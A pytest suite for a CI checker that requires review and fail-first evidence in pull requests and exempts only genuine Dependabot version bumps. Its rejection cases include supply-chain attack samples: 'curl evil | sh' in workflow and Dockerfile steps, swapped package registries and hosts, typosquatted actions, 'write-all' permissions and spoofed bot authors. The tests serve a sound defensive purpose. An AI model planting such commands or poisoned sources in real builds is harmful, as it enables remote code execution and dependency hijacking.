"""CI validation for the evidence required in pull request descriptions."""

import json
import subprocess
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
CHECKER = ROOT / "scripts" / "check_pr_evidence.py"


def _run_checker(tmp_path: Path, body: str) -> subprocess.CompletedProcess[str]:
    event_path = tmp_path / "event.json"
    event_path.write_text(json.dumps({"pull_request": {"body": body}}), encoding="utf-8")
    import os

    env = os.environ | {"GITHUB_EVENT_PATH": str(event_path)}
    return subprocess.run(  # noqa: S603 - own checker with controlled input
        [sys.executable, str(CHECKER)],
        cwd=ROOT,
        env=env,
        capture_output=True,
        text=True,
        check=False,
    )


def test_accepts_fail_first_output_and_review_summary(tmp_path: Path):
    result = _run_checker(
        tmp_path,
        """Review rounds: 2
Defects found and fixed: corrected the boundary condition
Fail-first output:
=========================== short test summary info ============================
FAILED tests/test_example.py::test_regression - AssertionError: expected 2
""",
    )

    assert result.returncode == 0, result.stderr


def test_accepts_explicit_exemption_for_behavior_neutral_change(tmp_path: Path):
    result = _run_checker(
        tmp_path,
        """Review rounds: 0
Defects found and fixed: none
Fail-first exemption: documentation-only change; runtime behavior is unchanged.
""",
    )

    assert result.returncode == 0, result.stderr


def test_rejects_unfilled_template_fields(tmp_path: Path):
    result = _run_checker(
        tmp_path,
        """Review rounds: <count>
Defects found and fixed: <summary or none>
Fail-first output: <paste failing test output or explain exemption>
""",
    )

    assert result.returncode != 0
    assert "Review rounds" in result.stderr
    assert "Fail-first" in result.stderr


def test_rejects_missing_failure_marker_or_exemption(tmp_path: Path):
    result = _run_checker(
        tmp_path,
        """Review rounds: 1
Defects found and fixed: none
Fail-first output:
The test passed.
""",
    )

    assert result.returncode != 0
    assert "failing test output" in result.stderr.lower()


FAIL_OUTPUT = (
    "=========================== short test summary info ============================\n"
    "FAILED tests/test_example.py::test_regression - AssertionError: expected 2\n"
)


def test_accepts_heading_form_of_fail_first_output(tmp_path: Path):
    for heading in ("## Fail-first output", "### Fail-first output", "## Fail-first output:"):
        result = _run_checker(
            tmp_path,
            f"Review rounds: 0\nDefects found and fixed: none\n\n{heading}\n\n{FAIL_OUTPUT}",
        )
        assert result.returncode == 0, (heading, result.stderr)


def test_heading_form_still_requires_failure_marker(tmp_path: Path):
    result = _run_checker(
        tmp_path,
        "Review rounds: 0\nDefects found and fixed: none\n\n## Fail-first output\n\nAll passed.\n",
    )

    assert result.returncode != 0
    assert "failing test output" in result.stderr.lower()


def test_malformed_review_rounds_message_states_expected_format(tmp_path: Path):
    result = _run_checker(
        tmp_path,
        f"Review rounds: 1 (one round, no findings)\nDefects found and fixed: none\n"
        f"Fail-first output:\n{FAIL_OUTPUT}",
    )

    assert result.returncode != 0
    assert "'Review rounds: 1 (one round, no findings)'" in result.stderr
    assert "on its own line" in result.stderr
    assert "digits only" in result.stderr


def test_ci_workflows_rerun_evidence_check_when_body_is_edited():
    for rel in (".github/workflows/ci.yml", "src/harness/.github/workflows/ci.yml"):
        text = (ROOT / rel).read_text(encoding="utf-8")
        assert "types: [opened, synchronize, reopened, edited]" in text, rel


def _load_validate():
    import importlib.util

    spec = importlib.util.spec_from_file_location("check_pr_evidence", CHECKER)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module.validate


def _render_template(text: str, *, exemption: bool) -> str:
    text = text.replace("<number>", "1").replace("<summary or none>", "none")
    if exemption:
        head, _, rest = text.partition("## Fail-first output")
        tail = rest.partition("Fail-first exemption:")[2]
        return (
            head
            + "Fail-first exemption:"
            + tail.replace("<reason, at least 20 characters>", "docs-only change, nothing to test")
        )
    start = text.index("<paste the failing")
    end = text.index("\n", start)
    text = text[:start] + "FAILED tests/test_x.py::test_y - AssertionError" + text[end:]
    return text.partition("No fail-first output")[0]


def test_template_renders_to_a_body_that_passes():
    validate = _load_validate()
    template = (ROOT / ".github" / "pull_request_template.md").read_text(encoding="utf-8")
    assert validate(_render_template(template, exemption=False)) == []
    assert validate(_render_template(template, exemption=True)) == []


def test_old_bullet_layout_fails():
    validate = _load_validate()
    old = (
        "- [ ] Review rounds: 1\n- [ ] defects found and fixed: none\n"
        "- Fail-first output:\n  FAILED tests/test_x.py\n"
    )
    assert validate(old) != []


def test_failure_message_prints_expected_layout(tmp_path: Path):
    result = _run_checker(tmp_path, "nothing useful")
    assert result.returncode == 1
    assert "Expected layout" in result.stderr
    assert "## Fail-first output" in result.stderr


def test_template_and_checker_copies_identical():
    for rel in (".github/pull_request_template.md", "scripts/check_pr_evidence.py"):
        assert (ROOT / rel).read_bytes() == (ROOT / "src" / "harness" / rel).read_bytes()


# --- Dependabot exemption (#426) -------------------------------------------------

BOT = "dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>"
H1, H2 = "a" * 40, "b" * 40


def _git(repo: Path, *args: str) -> str:
    return subprocess.run(  # noqa: S603
        ["git", "-c", "user.name=t", "-c", "user.email=t@example.com", *args],  # noqa: S607
        cwd=repo,
        capture_output=True,
        text=True,
        check=True,
    ).stdout.strip()


def _wheel(ver: str, digit: str) -> str:
    return (
        '    { url = "https://files.pythonhosted.org/packages/2f/21/ab/'
        f'ruff-{ver}-py3-none-any.whl", hash = "sha256:{digit * 64}", size = 10, '
        'upload-time = "2026-10-01T18:02:36.072Z" },\n'
    )


def _lock(ver: str, digit: str, spec: str = "0.1") -> str:
    return (
        f'[[package]]\nname = "ruff"\nversion = "{ver}"\n'
        'source = { registry = "https://pypi.org/simple" }\n'
        'sdist = { url = "https://files.pythonhosted.org/packages/c4/49/ab/'
        f'ruff-{ver}.tar.gz", hash = "sha256:{digit * 64}", size = 9 }}\nwheels = [\n'
        + _wheel(ver, digit)
        + "]\n\n[package.metadata]\nrequires-dist = [\n"
        + f'    {{ name = "ruff", specifier = ">={spec}" }},\n]\n'
    )


PYPROJECT = (
    '[dependency-groups]\ndev = ["pytest>=9.1.1", "ruff>=0.16.10"]\n'
    '[build-system]\nrequires = ["hatchling"]\n[tool.uv]\npackage = false\n'
)
WORKFLOW = f"steps:\n  - uses: actions/checkout@{H1} # v1.0.0\n  - run: echo hi\n"
DOCKER = "FROM python:3.12-slim\nRUN echo hi\n"
WF = ".github/workflows/ci.yml"
BASE = {
    "pyproject.toml": PYPROJECT,
    "uv.lock": _lock("0.1.0", "1", "0.1"),
    "Dockerfile": DOCKER,
    WF: WORKFLOW,
    "src.py": "x = 1\n",
}


def _dependabot_case(
    tmp_path: Path,
    changes: dict[str, str | bytes | None],
    *,
    login: str = "dependabot[bot]",
    user_type: str = "Bot",
    body: str = "Bumps something from 1 to 2.",
    author: str = BOT,
    rename: dict[str, str] | None = None,
    base_files: dict[str, str] | None = None,
    extra_commit_author: str | None = None,
) -> subprocess.CompletedProcess[str]:
    import os

    repo = tmp_path / "repo"
    repo.mkdir()
    _git(repo, "init", "-q")
    for name, text in (base_files or BASE).items():
        (repo / name).parent.mkdir(parents=True, exist_ok=True)
        (repo / name).write_text(text, encoding="utf-8", newline="")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "base")
    base = _git(repo, "rev-parse", "HEAD")
    for old, new in (rename or {}).items():
        _git(repo, "mv", old, new)
    for name, data in changes.items():
        if data is None:
            _git(repo, "rm", "-q", name)
        else:
            (repo / name).parent.mkdir(parents=True, exist_ok=True)
            raw = data if isinstance(data, bytes) else data.encode()
            (repo / name).write_bytes(raw)
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "--allow-empty", "-m", "head", f"--author={author}")
    if extra_commit_author:
        (repo / "note.txt").write_text("x", encoding="utf-8")
        _git(repo, "add", "-A")
        _git(repo, "commit", "-q", "-m", "more", f"--author={extra_commit_author}")
    head = _git(repo, "rev-parse", "HEAD")
    event_path = tmp_path / "event.json"
    event_path.write_text(
        json.dumps(
            {
                "pull_request": {
                    "body": body,
                    "user": {"login": login, "type": user_type},
                    "base": {"sha": base},
                    "head": {"sha": head},
                }
            }
        ),
        encoding="utf-8",
    )
    env = os.environ | {"GITHUB_EVENT_PATH": str(event_path)}
    return subprocess.run(  # noqa: S603
        [sys.executable, str(CHECKER)],
        cwd=repo,
        env=env,
        capture_output=True,
        text=True,
        check=False,
    )


def _bump_workflow(**kw: str) -> str:
    return WORKFLOW.replace(
        f"actions/checkout@{H1} # v1.0.0", kw.get("to", f"actions/checkout@{H2} # v2.0.0")
    )


PASS_CASES = {
    "pyproject versions": {
        "pyproject.toml": PYPROJECT.replace("pytest>=9.1.1", "pytest>=9.2.0").replace(
            "ruff>=0.16.10", "ruff>=0.17.0"
        )
    },
    "uv.lock version, entries, specifier": {"uv.lock": _lock("0.2.0", "2", "0.2")},
    "pyproject and lock together": {
        "pyproject.toml": PYPROJECT.replace("pytest>=9.1.1", "pytest>=9.2.0"),
        "uv.lock": _lock("0.2.0", "2", "0.2"),
    },
    "workflow sha and tag bump": {WF: _bump_workflow()},
    "workflow tag bump": {WF: _bump_workflow(to="actions/checkout@v2.0.0 # v2.0.0")},
    "dockerfile tag": {"Dockerfile": DOCKER.replace("3.12-slim", "3.13-slim")},
    "dockerfile digest": {
        "Dockerfile": DOCKER.replace("3.12-slim", "3.12-slim@sha256:" + "c" * 64)
    },
}


def test_dependabot_pure_version_bumps_pass_without_evidence(tmp_path: Path):
    for i, (name, changes) in enumerate(PASS_CASES.items()):
        d = tmp_path / str(i)
        d.mkdir()
        result = _dependabot_case(d, changes)
        assert result.returncode == 0, (name, result.stderr)
        assert "Dependabot" in result.stdout, name


def _lock_with(old: str, new: str) -> str:
    return _lock("0.2.0", "2", "0.2").replace(old, new)


FAIL_CASES: dict[str, dict[str, str | bytes | None]] = {
    "source file": {
        "pyproject.toml": PYPROJECT.replace("pytest>=9.1.1", "pytest>=9.2.0"),
        "src.py": "x = 2\n",
    },
    "pyproject added dependency": {
        "pyproject.toml": PYPROJECT.replace('"ruff>=0.16.10"]', '"ruff>=0.16.10", "evil>=1.0"]')
    },
    "pyproject build-system requires": {
        "pyproject.toml": PYPROJECT.replace('["hatchling"]', '["evil"]')
    },
    "pyproject index url": {
        "pyproject.toml": PYPROJECT + '[[tool.uv.index]]\nurl = "http://evil"\n'
    },
    "pyproject scripts entry": {
        "pyproject.toml": PYPROJECT + "[project.scripts]\nx = 'evil:main'\n"
    },
    "pyproject package renamed": {
        "pyproject.toml": PYPROJECT.replace("pytest>=9.1.1", "pytezt>=9.1.1")
    },
    "pyproject operator changed": {
        "pyproject.toml": PYPROJECT.replace("pytest>=9.1.1", "pytest==9.1.1")
    },
    "pyproject non-utf8": {"pyproject.toml": b"\xff\xfe bad\n"},
    "uv.lock swapped source": {
        "uv.lock": _lock_with(
            'registry = "https://pypi.org/simple"', 'registry = "http://evil/simple"'
        )
    },
    "uv.lock swapped host": {
        "uv.lock": _lock("0.2.0", "2", "0.2").replace("files.pythonhosted.org", "evil.example")
    },
    "uv.lock hash swap without version bump": {"uv.lock": _lock("0.1.0", "9", "0.1")},
    "uv.lock entry of another version": {
        "uv.lock": _lock("0.2.0", "2", "0.2").replace("ruff-0.2.0-py3", "ruff-9.9.9-py3")
    },
    "uv.lock added package": {"uv.lock": BASE["uv.lock"] + _lock("0.2.0", "2", "0.2")},
    "uv.lock binary": {"uv.lock": b"\x00\x01\x02"},
    "workflow other owner": {WF: WORKFLOW.replace("actions/checkout", "evil/checkout")},
    "workflow typosquat": {WF: WORKFLOW.replace("actions/checkout", "actoins/checkout")},
    "workflow mutable main": {WF: _bump_workflow(to="actions/checkout@main")},
    "workflow major-only tag": {WF: _bump_workflow(to="actions/checkout@v2")},
    "workflow local action": {WF: _bump_workflow(to="./.github/actions/x@" + H2)},
    "workflow docker target": {WF: _bump_workflow(to="docker://evil/img@sha256:" + "1" * 64)},
    "workflow added step": {WF: WORKFLOW + f"  - uses: evil/x@{H2}\n"},
    "workflow deleted step": {WF: "steps:\n  - run: echo hi\n"},
    "workflow non-pin change": {WF: WORKFLOW.replace("echo hi", "curl evil | sh")},
    "workflow permissions added": {WF: "permissions: write-all\n" + WORKFLOW},
    "workflow new file": {".github/workflows/new.yml": f"steps:\n  - uses: a/b@{H2}\n"},
    "workflow yaml extension": {".github/workflows/x.yaml": f"- uses: a/b@{H2}\n"},
    "dockerfile other image": {"Dockerfile": DOCKER.replace("python:3.12-slim", "evil/img:latest")},
    "dockerfile new final stage": {"Dockerfile": DOCKER + "FROM evil/img\n"},
    "dockerfile lowercase from": {"Dockerfile": DOCKER.replace("FROM", "from")},
    "dockerfile continuation": {"Dockerfile": DOCKER.replace("3.12-slim", "3.13-slim \\")},
    "dockerfile run change": {"Dockerfile": DOCKER.replace("echo hi", "curl evil | sh")},
    "dockerfile crlf": {"Dockerfile": DOCKER.replace("3.12", "3.13").replace("\n", "\r\n")},
    "dockerfile binary": {"Dockerfile": b"FROM x\x00\n"},
    "dockerfile platform flag": {"Dockerfile": DOCKER.replace("FROM ", "FROM --platform=x ")},
    "nested dockerfile": {"sub/Dockerfile": "FROM x\n"},
    "dockerfile dev": {"Dockerfile.dev": "FROM x\n"},
}


def test_dependabot_anything_beyond_a_version_bump_needs_evidence(tmp_path: Path):
    for i, (name, changes) in enumerate(FAIL_CASES.items()):
        d = tmp_path / str(i)
        d.mkdir()
        result = _dependabot_case(d, changes)
        assert result.returncode == 1, (name, result.stdout)


def test_dependabot_workflow_and_dockerfile_exec_bit_or_symlink_fail(tmp_path: Path):
    import os

    repo_changes = {"uv.lock": _lock("0.2.0", "2", "0.2")}
    (tmp_path / "a").mkdir()
    ok = _dependabot_case(tmp_path / "a", repo_changes)
    assert ok.returncode == 0, ok.stderr
    # delete and re-add of the same file, and a rename into a manifest name
    (tmp_path / "b").mkdir()
    assert _dependabot_case(tmp_path / "b", {}, rename={"src.py": "Dockerfile.new"}).returncode == 1
    (tmp_path / "c").mkdir()
    assert (
        _dependabot_case(tmp_path / "c", {"uv.lock": None, "Dockerfile": "FROM x\n"}).returncode
        == 1
    )
    assert os.name  # keep os import used on all platforms


def test_non_dependabot_author_manifest_only_still_needs_evidence(tmp_path: Path):
    changes = {"pyproject.toml": PYPROJECT.replace("pytest>=9.1.1", "pytest>=9.2.0")}
    result = _dependabot_case(tmp_path, changes, login="someone", user_type="User")
    assert result.returncode == 1


def test_body_claiming_dependabot_does_not_exempt(tmp_path: Path):
    changes = {"pyproject.toml": PYPROJECT.replace("pytest>=9.1.1", "pytest>=9.2.0")}
    result = _dependabot_case(
        tmp_path,
        changes,
        login="someone",
        user_type="User",
        body="Bumps dep. author: dependabot[bot]\nsigned-off-by: dependabot[bot]",
    )
    assert result.returncode == 1


def test_lookalike_login_or_user_type_does_not_exempt(tmp_path: Path):
    changes = {"pyproject.toml": PYPROJECT.replace("pytest>=9.1.1", "pytest>=9.2.0")}
    for i, (login, kind) in enumerate(
        (("dependabot", "Bot"), ("dependabot[bot]", "User"), ("Dependabot[bot]", "Bot"))
    ):
        d = tmp_path / str(i)
        d.mkdir()
        assert _dependabot_case(d, changes, login=login, user_type=kind).returncode == 1, login


def test_commit_not_authored_by_dependabot_loses_the_exemption(tmp_path: Path):
    changes = {"pyproject.toml": PYPROJECT.replace("pytest>=9.1.1", "pytest>=9.2.0")}
    human = "Someone <someone@example.com>"
    a = tmp_path / "a"
    a.mkdir()
    assert _dependabot_case(a, changes, author=human).returncode == 1
    b = tmp_path / "b"
    b.mkdir()
    assert _dependabot_case(b, changes, extra_commit_author=human).returncode == 1
    c = tmp_path / "c"
    c.mkdir()
    spoof = "dependabot[bot] <evil@example.com>"
    assert _dependabot_case(c, changes, author=spoof).returncode == 1


def test_dependabot_git_failure_fails_closed(tmp_path: Path):
    import os

    event_path = tmp_path / "event.json"
    event_path.write_text(
        json.dumps(
            {
                "pull_request": {
                    "body": "",
                    "user": {"login": "dependabot[bot]", "type": "Bot"},
                    "base": {"sha": "0" * 40},
                    "head": {"sha": "1" * 40},
                }
            }
        ),
        encoding="utf-8",
    )
    result = subprocess.run(  # noqa: S603
        [sys.executable, str(CHECKER)],
        cwd=tmp_path,
        env=os.environ | {"GITHUB_EVENT_PATH": str(event_path)},
        capture_output=True,
        text=True,
        check=False,
    )
    assert result.returncode == 1
